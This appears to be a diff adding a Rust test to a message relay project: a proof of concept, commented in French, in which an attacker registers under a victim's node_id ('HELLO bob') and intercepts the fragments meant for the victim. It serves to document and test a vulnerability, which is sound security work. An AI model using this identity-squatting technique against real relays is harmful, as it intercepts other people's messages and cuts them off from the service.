@@ -415,3 +415,48 @@ mod tests {
         );
     }
 }
+
+// ── PoC attaquant : détournement de la table de routage (HELLO squatté) ────
+// Deux connexions peuvent s'enregistrer sous LE MÊME node_id : le second
+// insert() écrase le premier. Tous les fragments adressés au node_id sont
+// alors routés vers le squatteur (vol de courrier + DoS), et quand le
+// squatteur se déconnecte, l'entrée est retirée → la vraie victime n'est
+// plus joignable tant qu'elle ne se reconnecte pas.
+#[tokio::test]
+async fn poc_hello_squatting_steals_routing() {
+    let addr = spawn_relay().await;
+
+    // La vraie victime s'enregistre.
+    let mut victim = TcpStream::connect(addr).await.unwrap();
+    victim.write_all(b"HELLO bob\n").await.unwrap();
+
+    // L'attaquante s'enregistre sous le MÊME node_id.
+    let mut attacker = TcpStream::connect(addr).await.unwrap();
+    attacker.write_all(b"HELLO bob\n").await.unwrap();
+
+    let mut alice = TcpStream::connect(addr).await.unwrap();
+    alice.write_all(b"HELLO alice\n").await.unwrap();
+    tokio::time::sleep(Duration::from_millis(100)).await;
+
+    let env = r#"{"kind":"fragment","from":"alice","to":"bob","session":"sH","seq":1,"type":"frag","idx":1,"threshold":4,"total":7,"payload":[4,2]}"#;
+    alice.write_all(format!("{env}\n").as_bytes()).await.unwrap();
+
+    // L'ATTAQUANTE reçoit le fragment adressé à bob — pas la victime.
+    let mut line = String::new();
+    tokio::time::timeout(Duration::from_secs(1), async {
+        let mut reader = BufReader::new(&mut attacker);
+        reader.read_line(&mut line).await.unwrap();
+    })
+    .await
+    .unwrap();
+    assert!(line.contains("\"session\":\"sH\""), "l'attaquante n'a rien reçu: {line}");
+
+    // La victime, elle, ne reçoit RIEN (détournée).
+    let mut vline = String::new();
+    let got = tokio::time::timeout(Duration::from_millis(200), async {
+        let mut reader = BufReader::new(&mut victim);
+        reader.read_line(&mut vline).await.unwrap();
+    })
+    .await;
+    assert!(got.is_err(), "VULN-ROUTING: la victime a reçu le fragment: {vline}");
+}
